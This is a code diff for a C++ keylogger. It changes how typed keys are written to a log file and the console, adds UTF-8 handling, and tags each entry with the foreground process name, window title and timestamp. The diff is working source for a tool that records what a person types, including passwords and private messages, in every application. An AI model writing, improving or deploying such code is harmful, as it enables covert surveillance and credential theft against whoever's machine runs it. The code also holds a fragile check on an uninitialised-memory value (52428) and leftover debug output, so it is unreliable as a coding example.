@@ -48,6 +48,10 @@ void Keylogger::start() {
 			keyboardHandler(key);
 		});
 
+		const std::locale utf8_locale
+			= std::locale(std::locale(), new std::codecvt_utf8<wchar_t>());
+		logFile.imbue(utf8_locale);
+
 		logFile.open(FILENAME, std::ios::app);
 		this->isActive = true;
 	}
@@ -57,8 +61,8 @@ void Keylogger::keyboardHandler(const wchar_t* keyText) {
 	addWindowTimeStamps();
 		
 	auto symbol = keyText;
-	logFile << StringUtilities::wstrToChars(keyText) << std::flush;
-	std::cout << StringUtilities::wstrToChars(keyText) << std::flush;
+	logFile << keyText << std::flush;
+	std::wcout << keyText << std::flush;
 }
 
 void Keylogger::addWindowTimeStamps() {
@@ -86,15 +90,18 @@ void Keylogger::addWindowTimeStamps() {
 		char timeStrBuffer[80];
 		strftime(timeStrBuffer, 80, "%F %X", localTime);
 
-		if (bufferTitle == nullptr || bufferTitle[0] == '\0') {
-			std::cout << "!!!!ploho!!!";
-		} else {
-			std::cout << "\n### " << StringUtilities::wstrToChars(bufferProcessName) <<
-				" --- " << StringUtilities::wstrToChars(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
+		if (bufferProcessName[0] == 52428) {
+			wcscpy(bufferProcessName, L"Unknown process");
 		}
 
-		logFile << "\n### " << StringUtilities::wstrToChars(bufferProcessName) << " --- " <<
-			StringUtilities::wstrToChars(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
+		if (bufferTitle == nullptr || bufferTitle[0] == '\0') {
+			std::wcout << "!!!!ploho!!!";
+		} else {
+			std::wcout << "\n### " << bufferProcessName <<
+				" --- " << bufferTitle << " ### " << timeStrBuffer << " ###\n";
+		}
+
+		logFile << "\n### " << bufferProcessName << " --- " << bufferTitle << " ### " << timeStrBuffer << " ###\n";
 	}
 }
 
